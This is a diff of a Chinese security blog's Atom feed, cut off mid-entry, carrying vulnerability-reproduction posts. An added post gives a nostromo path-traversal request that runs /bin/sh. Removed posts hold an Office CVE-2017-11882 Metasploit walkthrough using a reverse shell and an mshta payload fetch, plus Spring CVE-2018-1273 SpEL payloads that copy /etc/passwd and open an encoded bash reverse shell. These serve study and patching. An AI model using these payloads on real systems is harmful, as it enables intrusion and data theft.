@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.vkxss.top/"/>
-  <updated>2019-10-11T10:38:58.307Z</updated>
+  <updated>2019-10-17T07:32:00.814Z</updated>
   <id>http://www.vkxss.top/</id>
   
   <author>
@@ -15,6 +15,64 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>nostromo nhttpd 路径遍历漏洞</title>
+    <link href="http://www.vkxss.top/2019/10/17/CVE-2019-16278/"/>
+    <id>http://www.vkxss.top/2019/10/17/CVE-2019-16278/</id>
+    <published>2019-10-17T07:30:08.000Z</published>
+    <updated>2019-10-17T07:32:00.814Z</updated>
+    
+    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li><font face="微软雅黑">CVE-2019-16278</font></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>nostromo nhttpd &lt;= 1.9.6</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><ul><li><p>CVE-2019-16278.sh</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">   echo</span><br><span class="line">   echo</span><br><span class="line">   ifconfig 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>记录一下，请参考：</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278</a></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li><font face="微软雅黑">上waf或防火墙配置规则拦截,等待官方修复打补丁。</font></li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li><p>参考链接：</p><ul><li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807</a></li><li><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></li></ul></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- toc --&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
+      
+    
+    </summary>
+    
+    
+      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
+    
+    
+      <category term="CVE-2019-16278" scheme="http://www.vkxss.top/tags/CVE-2019-16278/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>接口快速测试小技巧(Python)</title>
+    <link href="http://www.vkxss.top/2019/10/11/%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
+    <id>http://www.vkxss.top/2019/10/11/接口快速测试小技巧(Python)/</id>
+    <published>2019-10-11T07:30:08.000Z</published>
+    <updated>2019-10-16T02:30:11.452Z</updated>
+    
+    <content type="html"><![CDATA[<h2><span id="接口快速测试小技巧python">接口快速测试小技巧(Python)</span></h2><ul><li><p><font face="微软雅黑">终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺</font></p></li><li><p><font face="微软雅黑">网站：<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2&gt;&lt;span id=&quot;接口快速测试小技巧python&quot;&gt;接口快速测试小技巧(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，
+      
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
+    
+    
+      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>SVG-XSS</title>
@@ -228,34 +286,6 @@
   </entry>
   
   <entry>
-    <title>什么是AJAX</title>
-    <link href="http://www.vkxss.top/2019/08/20/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86-%E4%BB%80%E4%B9%88%E6%98%AFAJAX/"/>
-    <id>http://www.vkxss.top/2019/08/20/前端知识-什么是AJAX/</id>
-    <published>2019-08-20T15:23:43.854Z</published>
-    <updated>2019-09-25T05:44:16.031Z</updated>
-    
-    <content type="html"><![CDATA[<h2><span id="一-什么是ajax">一、什么是Ajax?</span></h2><ul><li>AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术</li><li>Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。</li><li>这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。</li></ul><h2><span id="二-如何实现ajax">二、如何实现Ajax？</span></h2><ul><li>(1)创建XMLHttpRequest对象,也就是创建一个异步调用对象.</li><li>(2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息.</li><li>(3)设置响应HTTP请求状态变化的函数.</li><li>(4)发送HTTP请求.</li><li>(5)获取异步调用返回的数据.</li><li>(6)使用JavaScript和DOM实现局部刷新.</li></ul><h3><span id="0x01-demo">0x01 Demo</span></h3><ul><li><p>user.json</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;:&quot;VK&quot;,</span><br><span class="line">  &quot;age&quot;:&quot;25&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ajax.html<br>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hf9c32e51be034e6793aa1d2f91570c22J.jpg" style="zoom:40%"></center></font></p></li></ul><h3><span id="0x02-演示">0x02 演示</span></h3><ul><li>网站A获取网站B的用户数据：<ul><li>网站A：<a href="http://vkduang.com/AJAX/ajax.html" target="_blank" rel="noopener">http://vkduang.com/AJAX/ajax.html</a></li><li>网站B：<a href="http://vkkuayu.com:8000/user.json" target="_blank" rel="noopener">http://vkkuayu.com:8000/user.json</a></li><li>你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hfd7b5cb3cd674c65ba4889e7743814cfJ.jpg" style="zoom:40%"></center></font></li></ul></li></ul><h3><span id="0x03-哪些资源是默认可以跨域的">0x03 哪些资源是默认可以跨域的</span></h3><ul><li>上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。</li><li>思考🤔</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2&gt;&lt;span id=&quot;一-什么是ajax&quot;&gt;一、什么是Ajax?&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术&lt;/li&gt;
-
-      
-    
-    </summary>
-    
-    
-      <category term="前端安全" scheme="http://www.vkxss.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="前端知识" scheme="http://www.vkxss.top/tags/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Null Dereference</title>
     <link href="http://www.vkxss.top/2019/08/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Null%20Dereference/"/>
     <id>http://www.vkxss.top/2019/08/20/代码审计-Null Dereference/</id>
@@ -444,6 +474,34 @@
   </entry>
   
   <entry>
+    <title>什么是AJAX</title>
+    <link href="http://www.vkxss.top/2019/02/07/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86-%E4%BB%80%E4%B9%88%E6%98%AFAJAX/"/>
+    <id>http://www.vkxss.top/2019/02/07/前端知识-什么是AJAX/</id>
+    <published>2019-02-07T07:30:08.000Z</published>
+    <updated>2019-10-15T05:18:40.231Z</updated>
+    
+    <content type="html"><![CDATA[<h2><span id="一-什么是ajax">一、什么是Ajax?</span></h2><ul><li>AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术</li><li>Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。</li><li>这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。</li></ul><h2><span id="二-如何实现ajax">二、如何实现Ajax？</span></h2><ul><li>(1)创建XMLHttpRequest对象,也就是创建一个异步调用对象.</li><li>(2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息.</li><li>(3)设置响应HTTP请求状态变化的函数.</li><li>(4)发送HTTP请求.</li><li>(5)获取异步调用返回的数据.</li><li>(6)使用JavaScript和DOM实现局部刷新.</li></ul><h3><span id="0x01-demo">0x01 Demo</span></h3><ul><li><p>user.json</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;:&quot;VK&quot;,</span><br><span class="line">  &quot;age&quot;:&quot;25&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ajax.html<br>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hf9c32e51be034e6793aa1d2f91570c22J.jpg" style="zoom:40%"></center></font></p></li></ul><h3><span id="0x02-演示">0x02 演示</span></h3><ul><li>网站A获取网站B的用户数据：<ul><li>网站A：<a href="http://vkduang.com/AJAX/ajax.html" target="_blank" rel="noopener">http://vkduang.com/AJAX/ajax.html</a></li><li>网站B：<a href="http://vkkuayu.com:8000/user.json" target="_blank" rel="noopener">http://vkkuayu.com:8000/user.json</a></li><li>你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hfd7b5cb3cd674c65ba4889e7743814cfJ.jpg" style="zoom:40%"></center></font></li></ul></li></ul><h3><span id="0x03-哪些资源是默认可以跨域的">0x03 哪些资源是默认可以跨域的</span></h3><ul><li>上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。</li><li>思考🤔</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2&gt;&lt;span id=&quot;一-什么是ajax&quot;&gt;一、什么是Ajax?&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术&lt;/li&gt;
+
+      
+    
+    </summary>
+    
+    
+      <category term="前端安全" scheme="http://www.vkxss.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="前端知识" scheme="http://www.vkxss.top/tags/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86/"/>
+    
+  </entry>
+  
+  <entry>
     <title>CTF中常见的加解密集合</title>
     <link href="http://www.vkxss.top/2019/01/08/CTF-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9B%86%E5%90%88/"/>
     <id>http://www.vkxss.top/2019/01/08/CTF-常见的加解密集合/</id>
@@ -552,70 +610,6 @@
     
     
       <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Office远程代码执行漏洞(CVE-2017-11882)</title>
-    <link href="http://www.vkxss.top/2018/05/08/CVE-2017-11882/"/>
-    <id>http://www.vkxss.top/2018/05/08/CVE-2017-11882/</id>
-    <published>2018-05-08T07:30:08.000Z</published>
-    <updated>2019-10-09T06:03:11.171Z</updated>
-    
-    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#漏洞概述">漏洞概述</a></li><li><a href="#影响范围">影响范围</a></li><li><a href="#复现环境">复现环境</a></li><li><a href="#漏洞复现">漏洞复现</a></li><li><a href="#修复">修复</a></li></ul><!-- tocstop --><h2><span id="漏洞概述">漏洞概述</span></h2><p>此漏洞是由Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。</p><h2><span id="影响范围">影响范围</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">office 2003 </span><br><span class="line">office 2007 </span><br><span class="line">office 2010 </span><br><span class="line">office 2013 </span><br><span class="line">office 2016</span><br></pre></td></tr></table></figure><h2><span id="复现环境">复现环境</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">渗透机：Kali Linux + POC代码 </span><br><span class="line">靶机：Win10 + Office 2016</span><br><span class="line">工具已打包：https://github.com/vkbiu/CVE/tree/master/CVE-2017-11882</span><br></pre></td></tr></table></figure><h2><span id="漏洞复现">漏洞复现</span></h2><ul><li>生成word文档test.doc，打开doc文件之后，会弹出计算器（以此验证offce漏洞）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Command43b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc</span><br></pre></td></tr></table></figure><ul><li><p>win10 office2016触发成功(win10会报毒)</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hf66b40ca53854aab99f8e5e6f4e0aceev.png" style="zoom:40%"></center></font></p></li><li><p>在Kali Linux上构造带有shell后门的word文件，并开启监听。</p></li><li><p>把cve_2017_11882.rb复制到<br>/usr/share/Metasploit-framework/modules/exploits/windows/smb</p></li><li><p>再Copycve-2017-11882.rtf复制到/usr/share/metasploit-framework/data/exploits</p></li><li><p>启动metasploit</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Metasploit running on Kali Linux as root, using system database</span><br><span class="line">A database appears to be already configured, skipping initialization</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc&apos;           &apos;cdkOOOko:.</span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.</span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:</span><br><span class="line">  &apos;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&apos;</span><br><span class="line">  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo</span><br><span class="line">  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx</span><br><span class="line">  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl</span><br><span class="line">  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.</span><br><span class="line">   cOOOOOOO.MMM.OOc.MMMMM&apos;oOO.MMM,OOOOOOOc</span><br><span class="line">    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo</span><br><span class="line">     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl</span><br><span class="line">      ;OOOO&apos;MMM.OOOO.MMM:OOOO.MMM;OOOO;</span><br><span class="line">       .dOOo&apos;WM.OOOOocccxOOOO.MX&apos;xOOd.</span><br><span class="line">         ,kOl&apos;M.OOOOOOOOOOOOO.M&apos;dOk,</span><br><span class="line">           :kk;.OOOOOOOOOOOOO.;Ok:</span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:</span><br><span class="line">               ,xOOOOOOOOOOOx,</span><br><span class="line">                 .lOOOOOOOl.</span><br><span class="line">                    ,dOd,</span><br><span class="line">                      .</span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.53-dev-                         ]</span><br><span class="line">+ -- --=[ 1931 exploits - 1079 auxiliary - 332 post       ]</span><br><span class="line">+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; search 11882</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/fileformat/office_ms17_11882  2017-11-15       manual     No     Microsoft Office CVE-2017-11882</span><br><span class="line">   1  exploit/windows/smb/cve_2017_11882            2017-11-21       excellent  No     Microsoft Office Word Equation Editor RCE</span><br></pre></td></tr></table></figure><ul><li>使用CVE-2017-11882.rb模块，开启Meterpreter监听会话：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/cve_2017_11882  #使用模块</span><br><span class="line">msf5 exploit(windows/smb/cve_2017_11882) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp #设置tcp反弹会话</span><br><span class="line">msf5 exploit(windows/smb/cve_2017_11882) &gt; set lhost 192.168.36.131</span><br><span class="line">lhost =&gt; 192.168.36.131 #设置攻击机ip地址</span><br><span class="line">msf5 exploit(windows/smb/cve_2017_11882) &gt; set uripath 11882  #设置路径为11882，可自定义</span><br><span class="line">uripath =&gt; 11882</span><br><span class="line">msf5 exploit(windows/smb/cve_2017_11882) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 2.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.36.131:4444 </span><br><span class="line">msf5 exploit(windows/smb/cve_2017_11882) &gt; [*] Generating command with length 44</span><br><span class="line">[+] msf.rtf stored at /root/.msf4/local/msf.rtf</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/11882</span><br><span class="line">[*] Local IP: http://192.168.36.131:8080/11882</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure><ul><li>利用mshta，生成目标机的漏洞文档，命令如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.36.131:8080/11882&quot; -o 11882.doc</span><br><span class="line">[*] Done ! output file --&gt; 11882.doc</span><br></pre></td></tr></table></figure><ul><li>将生成的文件拷贝到win10靶机中运行，即在kali中可以看到</li><li>成功后，使用命令sessions 查看你控制的pc</li></ul><h2><span id="修复">修复</span></h2><ul><li>在线更新，开启Windows Update更新。</li><li>打补丁，此漏洞对应的微软补丁地址：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!-- toc --&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#漏洞概述&quot;&gt;漏洞概述&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#影响范围&quot;&gt;影响范围&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#复现环境&quot;&gt;复现环境&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#漏洞复现&quot;
-      
-    
-    </summary>
-    
-    
-      <category term="CVE-2017" scheme="http://www.vkxss.top/categories/CVE-2017/"/>
-    
-    
-      <category term="CVE-2017-11882" scheme="http://www.vkxss.top/tags/CVE-2017-11882/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2018-1273-RCE</title>
-    <link href="http://www.vkxss.top/2018/04/13/CVE-2018-1273/"/>
-    <id>http://www.vkxss.top/2018/04/13/CVE-2018-1273/</id>
-    <published>2018-04-13T07:30:08.000Z</published>
-    <updated>2019-10-10T07:14:19.570Z</updated>
-    
-    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#漏洞概述">漏洞概述</a></li><li><a href="#影响范围">影响范围</a></li><li><a href="#复现环境">复现环境</a></li><li><a href="#漏洞复现">漏洞复现</a></li><li><a href="#修复建议">修复建议</a></li><li><a href="#reference">Reference</a></li></ul><!-- tocstop --><h2><span id="漏洞概述">漏洞概述</span></h2><ul><li>Spring Data Commons组件中存在远程代码执行漏洞（CVE-2018-1273），攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。</li></ul><h2><span id="影响范围">影响范围</span></h2><ul><li><p>受影响的版本</p><p>  Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>  Spring Data REST 2.6 - 2.6.10(Ingalls SR10)<br>  Spring Data Commons 2.0 - 2.0.5 (Kay SR5)<br>  Spring Data REST 3.0 - 3.0.5(Kay SR5)<br>  官方已经不支持的旧版本</p></li><li><p>不受影响的版本</p><p>  Spring Data Commons ≥ 2.0.6<br>  Spring Data Commons ≥ 1.13.11<br>  Spring Data REST 2.6.11 (Ingalls SR11)<br>  Spring Data REST 3.0.6 (Kay SR6)<br>  Spring Boot 1.5.11<br>  Spring Boot 2.0.1</p></li></ul><h2><span id="复现环境">复现环境</span></h2><ul><li>docker环境搭建：<ul><li><a href="https://github.com/knqyf263/CVE-2018-1273" target="_blank" rel="noopener">https://github.com/knqyf263/CVE-2018-1273</a></li></ul></li><li>漏洞POC：<ul><li><a href="https://github.com/vkbiu/CVE/tree/master/cve-2018-1273" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/cve-2018-1273</a></li></ul></li></ul><h2><span id="漏洞复现">漏洞复现</span></h2><ul><li><p>漏洞利用POC：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;cp /etc/passwd /tmp&apos;)]=123</span><br></pre></td></tr></table></figure></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H255111cacdd343239916b36b815d5085O.png" style="zoom:50%"></center></font></p><ul><li><p>进入docker容器查看/tmp/目录下成功cp /etc/passwd文件</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hda487f0e5b9944f3b5bf340985f95cb8o.png" style="zoom:50%"></center></font></p></li><li><p>反弹shell payload：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xOTIvNTU3NyAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=123</span><br></pre></td></tr></table></figure></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hb4a8b3f4ac474f1a87a30e5b32f4f5eb8.png" style="zoom:50%"></center></font></p><h2><span id="修复建议">修复建议</span></h2><ul><li><p>官方已经在最新版本中修复了该漏洞，请受影响的用户尽快升级，以保证长期有效的防护。下载链接请参考下表：<br>  组件版本  下载链接<br>  Spring Data Commons 2.0.6<br>  <a href="https://github.com/spring-projects/spring-data-commons/archive/2.0.6.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/archive/2.0.6.RELEASE.zip</a></p><p>  Spring Data Commons 1.13.11<br>  <a href="https://github.com/spring-projects/spring-data-commons/archive/1.13.11.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/archive/1.13.11.RELEASE.zip</a></p><p>  Spring Data REST 3.0.6<br>  <a href="https://github.com/spring-projects/spring-data-rest/archive/3.0.6.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-rest/archive/3.0.6.RELEASE.zip</a></p><p>  Spring Data REST 2.6.11<br>  <a href="https://github.com/spring-projects/spring-data-rest/archive/2.6.11.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-rest/archive/2.6.11.RELEASE.zip</a></p><p>  Spring Boot 2.0.1<br>  <a href="https://github.com/spring-projects/spring-boot/archive/v2.0.1.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v2.0.1.RELEASE.zip</a></p><p>  Spring Boot 1.5.11<br>  <a href="https://github.com/spring-projects/spring-boot/archive/v1.5.11.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.5.11.RELEASE.zip</a></p></li></ul><h2><span id="reference">Reference</span></h2><ul><li><a 